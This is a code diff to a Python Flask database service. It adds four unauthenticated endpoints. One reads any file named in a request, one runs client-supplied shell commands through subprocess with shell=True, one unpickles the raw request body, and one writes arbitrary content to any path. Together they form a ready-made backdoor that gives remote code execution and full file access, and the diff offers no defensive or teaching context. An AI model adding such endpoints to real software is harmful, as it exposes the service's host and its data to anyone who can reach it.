@@ -1,6 +1,8 @@
 from flask import Flask, request, jsonify
 import sqlite3
 import os
+import pickle
+import subprocess
 
 app = Flask(__name__)
 DB_PATH = '/data/database.db'
@@ -31,6 +33,45 @@ def query():
         rows = cursor.fetchall()
         conn.close()
         return jsonify(rows)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 400
+
+@app.route('/file', methods=['GET'])
+def read_file():
+    filename = request.args.get('filename')
+    try:
+        with open(filename, 'r') as f:
+            content = f.read()
+        return jsonify({'content': content})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 400
+
+@app.route('/execute', methods=['POST'])
+def execute_command():
+    command = request.json.get('command')
+    try:
+        result = subprocess.check_output(command, shell=True, text=True)
+        return jsonify({'output': result})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 400
+
+@app.route('/deserialize', methods=['POST'])
+def deserialize_data():
+    data = request.get_data()
+    try:
+        obj = pickle.loads(data)
+        return jsonify({'deserialized': str(obj)})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 400
+
+@app.route('/write', methods=['POST'])
+def write_file():
+    filename = request.json.get('filename')
+    content = request.json.get('content')
+    try:
+        with open(filename, 'w') as f:
+            f.write(content)
+        return jsonify({'status': 'written'})
     except Exception as e:
         return jsonify({'error': str(e)}), 400
 
